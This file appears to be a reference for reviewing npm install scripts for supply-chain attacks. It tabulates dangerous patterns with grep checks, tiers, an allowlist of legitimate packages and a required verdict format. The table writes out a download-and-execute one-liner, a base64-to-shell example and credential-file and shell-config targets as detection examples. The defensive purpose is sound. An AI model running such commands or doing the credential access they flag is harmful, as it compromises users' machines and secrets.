# Dangerous install-script patterns (supply-chain-review/references/install-script-checks.md)

The complete dangerous-pattern table and verification commands behind Section 1 of the main file.

## The full dangerous-pattern table

| Pattern | Example | Verification grep | Tier |
|---|---|---|---|
| Download and execute a binary | `curl -sSL https://x/y -o /tmp/x && chmod +x /tmp/x && /tmp/x` | `grep -rnE '(curl|wget|Invoke-WebRequest)' <unpack dir>` | Block |
| Obfuscated payload | `echo "aGVsbG8=" | base64 -d | sh`, hex assembled then `eval` | `grep -rnE '(base64|eval|child_process|os\.system|fromCharCode)' <unpack dir>` | Block |
| Credential-file access | Reading/writing `~/.ssh`, `.npmrc`, `.gitconfig`, `credentials` | `grep -rnE '(\.ssh|npmrc|gitconfig|credential)' <unpack dir>` | Block |
| Global configuration writes | Writing `~/.bashrc`, `~/.zshrc`, `/etc/profile.d` | `grep -rnE '(bashrc|zshrc|profile\.d)' <unpack dir>` | Block |
| git dependency prepare/preinstall | The dependency is a `git+https://…` URL and declares a `prepare` script (runs at install time; invisible to `npm view`) | Locate with `git grep -nE 'git\+https?://' -- package.json`, then clone and `grep -nE '"(prepare|preinstall)"' .tmp/gitdep/package.json` | Same tier as postinstall (block-level candidate) |
| Calls to domains unrelated to the purpose | A markdown parser calling `telemetry.example.org` | `grep -rnE 'https?://' <unpack dir> | grep -v <package homepage domain>` | Record (hand to dependency-audit poisoning item 4) |

Unified verification command (run after unpacking):

```sh
npm pack <package> --pack-destination .tmp
tar -xzf .tmp/<package>-<version>.tgz -C .tmp
grep -rnE '(curl|wget|Invoke-WebRequest|base64|eval|child_process|os\.system|\.ssh|npmrc|gitconfig|bashrc|zshrc)' .tmp/package/
```

Criterion: every hit needs a human context read; "block" applies only to the first four patterns, the fifth is recorded first.

## Ecosystem-convention allowlist (false-positive criterion)

The install scripts of esbuild, sharp, node-gyp, core-js, puppeteer (optional), canvas, and similar download/compile **in line with the package's purpose** and **do not touch credentials or global configuration** — clearance requires both facts at once.
Criterion drill: `sharp`'s `install` downloads prebuilt libvips = purpose-consistent + no credential touch → clear; any package downloading `/tmp/x` then `chmod +x` and running it = purpose-unrelated → block.

## Output requirement

For every new package that has an install script, output one conclusion line:
`<package>@<version>: <script name> = <one-sentence behavior> → clear/record/block (reason: <purpose consistency>, <credential/global-config touch>)`
